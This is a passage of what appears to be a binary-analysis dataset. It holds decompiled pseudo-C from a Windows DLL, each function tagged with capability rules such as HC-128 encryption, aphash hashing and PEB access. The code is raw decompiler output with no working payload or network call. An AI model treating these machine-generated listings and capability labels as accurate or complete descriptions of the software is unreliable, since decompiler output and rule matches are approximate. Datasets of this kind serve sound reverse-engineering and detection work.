ppppppppiVar19 + (-8 - var_30h) < 0x20)) {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004ebff;\n            }\n            goto code_r0x00018004f008;\n        }\ncode_r0x00018004ebff:\n        auStack808 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack824._0_2_ = 0;\n        if (7 < uStack264) {\n            ppppppppiVar19 = CONCAT62(Stack286, uStack288);\n            var_30h = ppppppppiVar19;\n            if ((uStack264 * 2 + 2 < 0x1000) || (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20))\n            {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004ec58;\n            }\n            goto code_r0x00018004f00e;\n        }\ncode_r0x00018004ec58:\n        uStack272 = CONCAT44(*0x180101904, *0x180101900);\n        uStack264 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack288 = 0;\n        if (7 < uStack672) {\n            ppppppppiVar19 = CONCAT62(Stack694, uStack696);\n            var_30h = ppppppppiVar19;\n            if ((uStack672 * 2 + 2 < 0x1000) || (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20))\n            {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004ecb0;\n            }\n            goto code_r0x00018004f014;\n        }\ncode_r0x00018004ecb0:\n        uStack680 = CONCAT44(*0x180101904, *0x180101900);\n        uStack672 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack696 = 0;\n        if (uStack640 < 8) {\ncode_r0x00018004ed02:\n            uStack648 = CONCAT44(*0x180101904, *0x180101900);\n            uStack640 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack664 = 0;\n            if (7 < uStack192) {\n                var_30h = appppppppiStack216[0];\n                if ((0xfff < uStack192 * 2 + 2) &&\n                   (var_30h = appppppppiStack216[0][-1],  0x1f < appppppppiStack216[0] + (-8 - var_30h)))\n                goto code_r0x00018004f020;\n                fcn.18008fb24(var_30h);\n            }\n            if (uStack784 != 0) {\n                iStack792 = 0;\n                do {\n                    iVar20 = iStack792;\n                    ppiVar12 = fcn.18004dd40(var_30h, appppppppiStack184, uVar16 & 0xffffffff, \n                                             *(iStack776 + 0x30) + iStack792);\n                    puVar21 = &uStack152;\n                    if (7 < uVar24) {\n                        puVar21 = puVar22;\n                    }\n                    piVar14 = ppiVar12[2];\n                    if (ppiVar12[3] - piVar14 < piVar10) {\n                        piStack904 = piVar10;\n                        ppiVar12 = fcn.180013690(ppiVar12, piVar10, 0, puVar21);\n                        puVar22 = CONCAT62(Stack150, uStack152);\n                        piVar10 = var_80h_2;\n                    }\n                    else {\n                        ppiVar12[2] = piVar10 + piVar14;\n                        ppiVar13 = ppiVar12;\n                        if (0x7 < ppiVar12[3]) {\n                            ppiVar13 = *ppiVar12;\n                        }\n                        fcn.1800ade80(ppiVar13 + piVar14 * 2, puVar21, piVar10 * 2);\n                        *(ppiVar13 + (piVar10 + piVar14) * 2) = 0;\n                    }\n                    ppppppppiVar19 = *ppiVar12;\n                    piStack248 = ppiVar12[1];\n                    piStack240 = ppiVar12[2];\n                    piVar14 = ppiVar12[3];\n                    ppiVar12[2] = NULL;\n                    ppiVar12[3] = 0x7;\n                    *ppiVar12 = 0;\n                    arg4_00 = &ppppppppiStack256;\n                    if (0x7 < piVar14) {\n                        arg4_00 = ppppppppiVar19;\n                    }\n                    pppppppiVar4 = ppppppppiStack768[2];\n                    ppppppppiStack256 = ppppppppiVar19;\n                    piStack232 = piVar14;\n                    if (ppppppppiStack768[3] - pppppppiVar4 < piStack240) {\n                        var_30h = ppppppppiStack768;\n                        piStack904 = piStack240;\n                        fcn.180013690(ppppppppiStack768, piStack240, 0, arg4_00);\n                        ppppppppiVar19 = ppppppppiStack256;\n                        piVar14 = piStack232;\n                    }\n                    else {\n                        pppppppiVar2 = piStack240 + pppppppiVar4;\n                        ppppppppiStack768[2] = pppppppiVar2;\n                        ppppppppiVar23 = ppppppppiStack768;\n                        if (0x7 < ppppppppiStack768[3]) {\n                            ppppppppiVar23 = *ppppppppiStack768;\n                        }\n                        var_30h = ppppppppiVar23 + pppppppiVar4 * 2;\n                        fcn.1800ade80(var_30h, arg4_00, piStack240 * 2);\n                        *(ppppppppiVar23 + pppppppiVar2 * 2) = 0;\n                        iVar20 = iStack792;\n                    }\n                    if (0x7 < piVar14) {\n                        var_30h = ppppppppiVar19;\n                        if ((0xfff < piVar14 * 2 + 2U) &&\n                           (var_30h = ppppppppiVar19[-1],  0x1f < ppppppppiVar19 + (-8 - var_30h)))\n                        goto code_r0x00018004f026;\n                        fcn.18008fb24(var_30h);\n                    }\n                    if (7 < uStack160) {\n                        var_30h = appppppppiStack184[0];\n                        if ((0xfff < uStack160 * 2 + 2) &&\n                           (var_30h = appppppppiStack184[0][-1],  0x1f < appppppppiStack184[0] + (-8 - var_30h)))\n                        goto code_r0x00018004f02c;\n                        fcn.18008fb24(var_30h);\n                    }\n                    uVar16 = uVar16 + 1;\n                    iStack792 = iVar20 + 0x10;\n                    uVar24 = var_78h_2;\n                } while (uVar16 < uStack784);\n            }\n            if (var_78h_2 < 8) {\ncode_r0x00018004ef90:\n                fcn.18008fb00(var_bp_40h ^ auStack936);\n                return;\n            }\n            puVar21 = puVar22;\n            if ((var_78h_2 * 2 + 2 < 0x1000) || (puVar21 = *(puVar22 + -4),  puVar22 + (-8 - puVar21) < 0x20)) {\n                fcn.18008fb24(puVar21);\n                goto code_r0x00018004ef90;\n            }\n            fcn.1800b3528();\n            goto code_r0x00018004efc0;\n        }\n        ppppppppiVar19 = CONCAT62(Stack662, uStack664);\n        var_30h = ppppppppiVar19;\n        if ((uStack640 * 2 + 2 < 0x1000) || (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20)) {\n            fcn.18008fb24(var_30h);\n            goto code_r0x00018004ed02;\n        }\n    }\n    else {\n        iVar6 = CONCAT62(Stack478, uStack480);\n        iVar11 = iVar6;\n        if ((CONCAT44(uStack452, uStack456) * 2 + 2 < 0x1000) || (iVar11 = *(iVar6 + -8),  (iVar6 - iVar11) - 8U < 0x20)\n           ) {\n            fcn.18008fb24(iVar11);\n            goto code_r0x00018004e149;\n        }\ncode_r0x00018004efc0:\n        fcn.1800b3528();\ncode_r0x00018004efc6:\n        fcn.1800b3528();\ncode_r0x00018004efcc:\n        fcn.1800b3528();\ncode_r0x00018004efd2:\n        fcn.1800b3528();\ncode_r0x00018004efd8:\n        fcn.180011cd0();\ncode_r0x00018004efde:\n        fcn.1800b3528();\ncode_r0x00018004efe4:\n        fcn.1800b3528();\ncode_r0x00018004efea:\n        fcn.1800b3528();\ncode_r0x00018004eff0:\n        fcn.1800b3528();\ncode_r0x00018004eff6:\n        fcn.1800b3528();\ncode_r0x00018004effc:\n        fcn.1800b3528();\ncode_r0x00018004f002:\n        fcn.1800b3528();\ncode_r0x00018004f008:\n        fcn.1800b3528();\ncode_r0x00018004f00e:\n        fcn.1800b3528();\ncode_r0x00018004f014:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018004f020:\n    fcn.1800b3528();\ncode_r0x00018004f026:\n    fcn.1800b3528();\ncode_r0x00018004f02c:\n    fcn.1800b3528();\n    pcVar5 = swi(3);\n    (*pcVar5)();\n    return;\n}\n",
        "token_count": 10510
    },
    "180065f0": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180065f00(int64_t *arg1, uchar *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    code *pcVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int64_t aiStack200 [3];\n    ulong uStack176;\n    uchar auStack168 [32];\n    uchar auStack136 [64];\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ &stack0xffffffffffffff58;\n    uVar1 = *(arg1 + 10);\n    uVar2 = *(arg1 + 0x54);\n    uVar9 = arg1[1];\n    uVar3 = *(arg1 + 0xb);\n    uVar4 = *(arg1 + 0x5c);\n    iVar8 = uVar9 * 8 + 1;\n    uVar12 = iVar8 & 0x1ff;\n    iVar11 = 0x1c0;\n    if (0x1c0 < uVar12) {\n        iVar11 = 0x3c0;\n    }\n    uVar12 = (iVar11 - uVar12) + iVar8 >> 3;\n    if (uVar9 < 0x40) {\n        *(uVar9 + 0x10 + arg1) = 0x80;\n        uVar9 = arg1[1];\n    }\n    else {\n        auStack136[0] = 0x80;\n    }\n    uVar7 = uVar9 + 1;\n    if (uVar7 < 0x40) {\n        puVar10 = arg1 + uVar9 + 0x11;\n        for (iVar8 = 0x40 - uVar7; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        uVar7 = 0x40;\n    }\n    if (uVar7 < uVar12) {\n        uVar9 = uVar7 - 0x40;\n        do {\n            if (0x3f < uVar9) {\n                uStack176 = 0x1800660f8;\n                fcn.1800901d8();\n                pcVar5 = swi(3);\n                (*pcVar5)();\n                return;\n            }\n            (&stack0xffffffffffffff78)[uVar9] = 0;\n            uVar7 = uVar7 + 1;\n            uVar9 = uVar9 + 1;\n        } while (uVar7 < uVar12);\n    }\n    iVar8 = (arg1[1] + *arg1) * 8;\n    if (uVar12 < 0x40) {\n        piVar6 = arg1 + 2;\n    }\n    else {\n        piVar6 = &stack0xffffffffffffff38;\n    }\n    puVar10 = piVar6 + uVar12;\n    *puVar10 = iVar8;\n    puVar10[1] = iVar8 >> 8;\n    puVar10[2] = iVar8 >> 0x10;\n    puVar10[3] = iVar8 >> 0x18;\n    puVar10[4] = iVar8 >> 0x20;\n    puVar10[5] = iVar8 >> 0x28;\n    puVar10[6] = iVar8 >> 0x30;\n    puVar10[7] = iVar8 >> 0x38;\n    uStack176 = 0x180066028;\n    fcn.1800654e0(arg1, arg1 + 2);\n    if (0x40 < uVar12) {\n        uStack176 = 0x18006603b;\n        fcn.1800654e0(arg1, &stack0xffffffffffffff78);\n    }\n    *arg2 = *(arg1 + 10);\n    arg2[1] = *(arg1 + 0x51);\n    arg2[2] = *(arg1 + 0x52);\n    arg2[3] = *(arg1 + 0x53);\n    *(arg1 + 10) = uVar1;\n    arg2[4] = *(arg1 + 0x54);\n    arg2[5] = *(arg1 + 0x55);\n    arg2[6] = *(arg1 + 0x56);\n    arg2[7] = *(arg1 + 0x57);\n    *(arg1 + 0x54) = uVar2;\n    arg2[8] = *(arg1 + 0xb);\n    arg2[9] = *(arg1 + 0x59);\n    arg2[10] = *(arg1 + 0x5a);\n    arg2[0xb] = *(arg1 + 0x5b);\n    *(arg1 + 0xb) = uVar3;\n    arg2[0xc] = *(arg1 + 0x5c);\n    arg2[0xd] = *(arg1 + 0x5d);\n    arg2[0xe] = *(arg1 + 0x5e);\n    arg2[0xf] = *(arg1 + 0x5f);\n    *(arg1 + 0x5c) = uVar4;\n    uStack176 = 0x1800660db;\n    fcn.18008fb00(uStack72 ^ &stack0xffffffffffffff58);\n    return;\n}\n",
        "token_count": 1255
    },
    "1800b4fe": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.1800b4fec(int64_t arg1)\n\n{\n    int64_t arg4;\n    int64_t arg1_00;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint16_t uVar5;\n    ulong arg2;\n    uint *arg2_00;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    ushort uVar8;\n    int64_t arg3;\n    uchar auStack104 [32];\n    int64_t iStack72;\n    uint uStack56;\n    ushort uStack52;\n    uint64_t uStack48;\n    \n    uStack48 = *0x180123080 ^ auStack104;\n    uVar5 = *(arg1 + 0x42);\n    uVar8 = 0x78;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x0001800b5113:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001800b5117:\n            arg2 = 10;\ncode_r0x0001800b511f:\n            cVar4 = fcn.1800b5b28(arg1, arg2);\n        }\n        else {\n            if (uVar5 == 0x41) goto code_r0x0001800b5126;\n            if (uVar5 == 0x43) {\ncode_r0x0001800b507f:\n                cVar4 = fcn.1800b58b8(arg1);\n            }\n            else {\n                if (uVar5 < 0x45) goto code_r0x0001800b528b;\n                if (uVar5 < 0x48) goto code_r0x0001800b5126;\n                if (uVar5 == 0x53) {\ncode_r0x0001800b50cf:\n                    cVar4 = fcn.1800b5e68(arg1);\n                }\n                else {\n                    if (uVar5 == 0x58) goto code_r0x0001800b50e4;\n                    if (uVar5 != 0x5a) {\n                        if (uVar5 != 0x61) {\n                            if (uVar5 != 99) goto code_r0x0001800b528b;\n                            goto code_r0x0001800b507f;\n                        }\n                        goto code_r0x0001800b5126;\n                    }\n                    cVar4 = fcn.1800b532c(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if (0x67 < uVar5) {\n            if (uVar5 == 0x69) goto code_r0x0001800b5113;\n            if (uVar5 == 0x6e) {\n                cVar4 = fcn.1800b5cf4(arg1);\n                goto code_r0x0001800b512b;\n            }\n            if (uVar5 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                arg2 = 8;\n            }\n            else if (uVar5 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x0001800b50e4:\n                arg2 = 0x10;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x0001800b50cf;\n                if (uVar5 == 0x75) goto code_r0x0001800b5117;\n                if (uVar5 != 0x78) goto code_r0x0001800b528b;\n                arg2 = 0x10;\n            }\n            goto code_r0x0001800b511f;\n        }\ncode_r0x0001800b5126:\n        cVar4 = fcn.1800b55c0(arg1);\n    }\ncode_r0x0001800b512b:\n    if ((cVar4 == '\\0') || (*(arg1 + 0x40) != '\\0')) goto code_r0x0001800b528b;\n    uVar2 = *(arg1 + 0x30);\n    uStack56 = 0;\n    uStack52 = 0;\n    arg3 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack56 = 0x20;\n                    arg3 = 1;\n                }\n                goto code_r0x0001800b5190;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack56 = uVar5;\n        arg3 = 1;\n    }\ncode_r0x0001800b5190:\n    iVar1 = *(arg1 + 0x42);\n    if (((iVar1 - 0x58U & 0xffdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&uStack56 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&uStack56 + arg3 * 2 + 2) = uVar8;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.1800b408c(arg1_00, uVar2 & 0xffffff00 | 0x20, uVar7, arg4);\n    }\n    iStack72 = arg1 + 0x10;\n    arg2_00 = &uStack56;\n    fcn.1800b6198(arg1_00, arg2_00, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.1800b408c(arg1_00, arg2_00 & 0xffffffffffffff00 | 0x30, uVar7, arg4);\n    }\n    uVar6 = 0;\n    fcn.1800b6008(arg1);\n    if ((-1 < *(arg1 + 0x28)) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        fcn.1800b408c(arg1_00, uVar6 & 0xffffffffffffff00 | 0x20, uVar7, arg1 + 0x28);\n    }\ncode_r0x0001800b528b:\n    fcn.18008fb00(uStack48 ^ auStack104);\n    return;\n}\n",
        "token_count": 1758
    },
    "1800cccc": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.1800ccccc(int64_t *arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uchar *in_R8;\n    uint64_t uVar11;\n    uchar *in_R9;\n    int64_t iVar12;\n    int64_t iVar13;\n    ulong uStackX24;\n    int64_t iStackX32;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_bp_10h;\n    \n    uVar9 = 0;\n    if (arg2 == NULL) {\n        puVar4 = fcn.1800ba53c(arg1);\n        *puVar4 = 0x16;\n        fcn.1800b3508();\n        uVar5 = 0x16;\n    }\n    else {\n        *arg2 = 0;\n        iVar6 = *arg1;\n        auStack88 = ZEXT816(0);\n        uStack72 = 0;\n        while (iVar6 != 0) {\n            uStackX24 = CONCAT53(uStackX24._3_5_, 0x3f2a);\n            iVar6 = fcn.1800d43f0(iVar6, &uStackX24, in_R8, in_R9);\n            if (iVar6 == 0) {\n                in_R9 = auStack88;\n                in_R8 = NULL;\n                uVar2 = fcn.1800cc834(*arg1, 0, 0, in_R9);\n            }\n            else {\n                in_R8 = auStack88;\n                uVar2 = fcn.1800cc9bc(*arg1, iVar6, in_R8);\n            }\n            uVar5 = uVar2;\n            if (uVar2 != 0) {\n                goto code_r0x0001800cc7c9;\n            }\n            arg1 = arg1 + 1;\n            iVar6 = *arg1;\n        }\n        uStackX24 = 0;\n        iVar6 = (auStack88._8_8_ - auStack88._0_8_ >> 3) + 1;\n        uVar5 = (auStack88._8_8_ - auStack88._0_8_) + 7U >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar5 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        uVar10 = uVar9;\n        uVar11 = uVar9;\n        if (uVar5 != 0) {\n            do {\n                iVar7 = -1;\n                do {\n                    iVar7 = iVar7 + 1;\n                } while (*(*piVar8 + iVar7) != '\\0');\n                piVar8 = piVar8 + 1;\n                uVar11 = uVar11 + 1 + iVar7;\n                uVar10 = uVar10 + 1;\n                uStackX24 = uVar11;\n            } while (uVar10 != uVar5);\n        }\n        iVar7 = fcn.1800c0ec4(iVar6, uStackX24);\n        uVar5 = 0xffffffffffffffff;\n        if (iVar7 != 0) {\n            iVar6 = iVar7 + iVar6 * 8;\n            iStackX32 = iVar6;\n            if (auStack88._0_8_ != auStack88._8_8_) {\n                piVar8 = auStack88._0_8_;\n                do {\n                    iVar12 = -1;\n                    do {\n                        iVar13 = iVar12;\n                        iVar12 = iVar13 + 1;\n                    } while (*(*piVar8 + iVar12) != '\\0');\n                    iVar13 = iVar13 + 2;\n                    iVar3 = fcn.1800d18d4(iStackX32, (iVar6 - iStackX32) + uStackX24, *piVar8, iVar13);\n                    if (iVar3 != 0) {\n                        fcn.1800b3558(0, 0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        uVar9 = (*pcVar1)();\n                        return uVar9;\n                    }\n                    *((iVar7 - auStack88._0_8_) + piVar8) = iStackX32;\n                    iStackX32 = iStackX32 + iVar13;\n                    piVar8 = piVar8 + 1;\n                } while (piVar8 != auStack88._8_8_);\n            }\n            *arg2 = iVar7;\n            uVar5 = uVar9;\n        }\n        fcn.1800c34d4(0);\ncode_r0x0001800cc7c9:\n        uVar10 = auStack88._8_8_ + (7 - auStack88._0_8_) >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar10 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        if (uVar10 != 0) {\n            do {\n                fcn.1800c34d4(*piVar8);\n                uVar9 = uVar9 + 1;\n                piVar8 = piVar8 + 1;\n            } while (uVar9 != uVar10);\n        }\n        fcn.1800c34d4(auStack88._0_8_);\n        uVar5 = uVar5 & 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 1425
    },
    "180006aa": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180006aa0(ulong noname_0, int64_t **arg2, uchar (**arg3) [16], int64_t **arg4)\n\n{\n    uint8_t **ppuVar1;\n    uchar (*pauVar2) [16];\n    code *pcVar3;\n    uchar (**arg1) [16];\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    int64_t iVar8;\n    uint8_t **ppuVar9;\n    ulong uVar10;\n    uchar uVar11;\n    int64_t iVar12;\n    int64_t *piVar13;\n    int64_t iVar14;\n    ulong *puVar15;\n    uint64_t uVar16;\n    uchar *puVar17;\n    int64_t **ppiVar18;\n    uchar (*arg1_00) [16];\n    uchar *puVar19;\n    int64_t iVar20;\n    uchar extraout_XMM0 [16];\n    uchar auVar21 [16];\n    uchar extraout_XMM0_00 [16];\n    ulong var_8h_2;\n    ulong var_10h;\n    ulong var_18h_2;\n    ulong var_bp_20h;\n    ulong var_28h;\n    ulong var_38h_2;\n    ulong var_40h_2;\n    ulong var_48h;\n    uchar auStack392 [32];\n    int64_t **ppiStack360;\n    int64_t **ppiStack352;\n    uchar uStack344;\n    unkbyte7 Stack343;\n    int64_t iStack328;\n    uint64_t uStack320;\n    int64_t *piStack312;\n    uint uStack304;\n    uint uStack300;\n    int64_t *piStack296;\n    uint64_t uStack288;\n    uint uStack280;\n    ulong uStack272;\n    ulong uStack256;\n    uint64_t uStack248;\n    int32_t iStack240;\n    uchar (**ppauStack232) [16];\n    int64_t iStack224;\n    int64_t **ppiStack216;\n    uint auStack208 [2];\n    uchar *puStack200;\n    uchar uStack192;\n    uchar uStack191;\n    unkbyte6 Stack190;\n    ulong uStack176;\n    uint64_t uStack168;\n    uchar *puStack160;\n    int64_t **ppiStack152;\n    ulong uStack144;\n    int64_t **ppiStack136;\n    int64_t **var_bp_78h;\n    int64_t var_bp_70h;\n    ulong var_bp_68h;\n    int64_t var_60h;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_48h_2;\n    uint64_t var_40h;\n    uint64_t var_38h;\n    ulong var_28h_2;\n    ulong var_18h;\n    ulong var_10h_2;\n    ulong var_8h;\n    \n    uStack144 = 0xfffffffffffffffe;\n    var_38h = *0x180123080 ^ auStack392;\n    uStack280 = 0;\n    ppauStack232 = arg3;\n    ppiStack216 = arg2;\n    ppiStack136 = arg2;\n    var_bp_78h = arg4;\n    if ((arg4[2] == NULL) && (arg4 != 0x1801255b8)) {\n        uVar10 = 0x1801255b8;\n        if (7 < *0x1801255d0) {\n            uVar10 = *0x1801255b8;\n        }\n        fcn.180010d70(arg4, uVar10, *0x1801255c8);\n    }\n    puStack160 = &uStack192;\n    ppiStack360 = fcn.18000da90(&uStack192, arg4);\n    puStack200 = &uStack272;\n    uStack256 = 0;\n    uStack248 = 0xf;\n    uStack272._0_1_ = 0;\n    piVar7 = &uStack272;\n    fcn.180011120(piVar7, 0x1800f46b0, 0xd);\n    piStack296 = NULL;\n    uStack288 = 0;\n    piVar13 = arg2[2];\n    ppiVar18 = arg2;\n    if (0x7 < arg2[3]) {\n        ppiVar18 = *arg2;\n    }\n    if (piVar13 < 0x8) {\n        piStack312 = *ppiVar18;\n        uStack304 = *(ppiVar18 + 1);\n        uStack300 = *(ppiVar18 + 0xc);\n        uVar16 = 7;\n    }\n    else {\n        uVar16 = piVar13 | 7;\n        if (0x7ffffffffffffffe < uVar16) {\n            uVar16 = 0x7ffffffffffffffe;\n        }\n        piVar7 = fcn.180011cf0(&piStack312, uVar16 + 1);\n        piStack312 = piVar7;\n        fcn.1800ade80(piVar7, ppiVar18, piVar13 * 2 + 2);\n    }\n    piStack296 = piVar13;\n    uStack288 = uVar16;\n    fcn.180006850(piVar7, &var_58h, &piStack312, &uStack272);\n    _var_bp_70h = ZEXT816(0);\n    var_60h = 0;\n    uStack256 = CONCAT44(*0x180101914, *0x180101910);\n    uStack248 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack272._0_1_ = 0;\n    puVar17 = &uStack272;\n    fcn.180011120(puVar17, 0x1800f4654, 1);\n    iVar4 = fcn.18000a0f0(puVar17, &var_58h, &var_bp_70h, &uStack272);\n    puVar17 = iVar4;\n    if (0xf < uStack248) {\n        iVar12 = CONCAT71(uStack272._1_7_, uStack272);\n        iVar14 = iVar12;\n        if ((0xfff < uStack248 + 1) && (iVar14 = *(iVar12 + -8),  0x1f < (iVar12 - iVar14) - 8U))\n        goto code_r0x0001800076e2;\n        fcn.18008fb24(iVar14);\n    }\n    arg1 = ppauStack232;\n    fcn.180013bc0(*ppauStack232, ppauStack232[1]);\n    arg1_00 = *arg1;\n    arg1[1] = arg1_00;\n    pauVar2 = *arg1;\n    iVar14 = (arg1_00 - pauVar2) / 6 + (arg1_00 - pauVar2 >> 0x3f);\n    puVar19 = (iVar14 >> 3) - (iVar14 >> 0x3f);\n    puStack160 = puVar17;\n    if (puVar17 < puVar19) {\n        fcn.180013bc0(pauVar2[puVar17 * 3], arg1_00);\n        arg1[1] = pauVar2[puVar17 * 3];\n    }\n    else if (puVar19 < puVar17) {\n        if ((arg1[2] - pauVar2) / 0x30 < puVar17) {\n            fcn.180014d70(arg1, puVar17);\n        }\n        else {\n            iVar14 = puVar17 - puVar19;\n            if (iVar14 != 0) {\n                puVar15 = arg1_00[2] + 8;\n                auVar21 = extraout_XMM0;\n                do {\n                    auVar21 = auVar21 & 0x0;\n                    *arg1_00 = auVar21;\n                    arg1_00[1] = auVar21;\n                    arg1_00[2] = auVar21;\n                    *(puVar15 + -0x24) = 0;\n                    *(puVar15 + -4) = 0;\n                    puVar15[-1] = 0;\n                    *puVar15 = 7;\n                    *(puVar15 + -3) = 0;\n                    arg1_00 = arg1_00[3];\n                    puVar15 = puVar15 + 6;\n                    iVar14 = iVar14 + -1;\n                } while (iVar14 != 0);\n            }\n            fcn.180013bc0(arg1_00, arg1_00);\n            arg1[1] = arg1_00;\n        }\n    }\n    iStack240 = 0;\n    if (0 < iVar4) {\n        iVar14 = 0;\n        puStack200 = NULL;\n        iStack224 = 0;\n        do {\n            iVar12 = iStack224;\n            puVar15 = var_bp_70h + iVar14;\n            piStack296 = NULL;\n            uStack288 = 0xf;\n            piStack312 = piStack312 & 0xffffffffffffff00;\n            if (puVar15[2] < 3) {\n                fcn.180011cd0();\n                goto code_r0x00018000771e;\n            }\n            iVar8 = puVar15[2] - 3;\n            iVar20 = -1;\n            if (iVar8 != -1) {\n                iVar20 = iVar8;\n            }\n            if (0xf < puVar15[3]) {\n                puVar15 = *puVar15;\n            }\n            fcn.180011120(&piStack312, puVar15 + 3, iVar20);\n            uVar5 = fcn.1800679c0(&piStack312, 10);\n            if (0xf < uStack288) {\n                piVar7 = piStack312;\n                if (0xfff < uStack288 + 1) {\n                    piVar7 = piStack312[-1];\n                    if (0x1f < piStack312 + (-8 - piVar7)) {\n                        fcn.1800b3528(piVar7, uStack288 + 0x28);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(piVar7);\n            }\n            *(**ppauStack232 + iVar12) = uVar5;\n            ppiStack152 = &piStack312;\n            piStack296 = NULL;\n            uStack288 = 0;\n            piVar7 = arg4[2];\n            ppiVar18 = arg4;\n            if (0x7 < arg4[3]) {\n                ppiVar18 = *arg4;\n            }\n            if (piVar7 < 0x8) {\n                piStack312 = *ppiVar18;\n                uStack304 = *(ppiVar18 + 1);\n                uStack300 = *(ppiVar18 + 0xc);\n                uStack288 = 7;\n            }\n            else {\n                uVar16 = piVar7 | 7;\n                if (0x7ffffffffffffffe < uVar16) {\n                    uVar16 = 0x7ffffffffffffffe;\n                }\n                piStack312 = fcn.180011cf0(&piStack312, uVar16 + 1);\n                fcn.1800ade80(piStack312, ppiVar18, piVar7 * 2 + 2);\n                uStack288 = uVar16;\n            }\n            auStack208[0] = 0;\n            iStack328 = 0;\n            uStack320 = 0xf;\n            uStack344 = 0;\n            uStack280 = 3;\n            uVar16 = *(var_bp_70h + iVar14 + 0x10) + 9;\n            piStack296 = piVar7;\n            if (0xf < uVar16) {\n                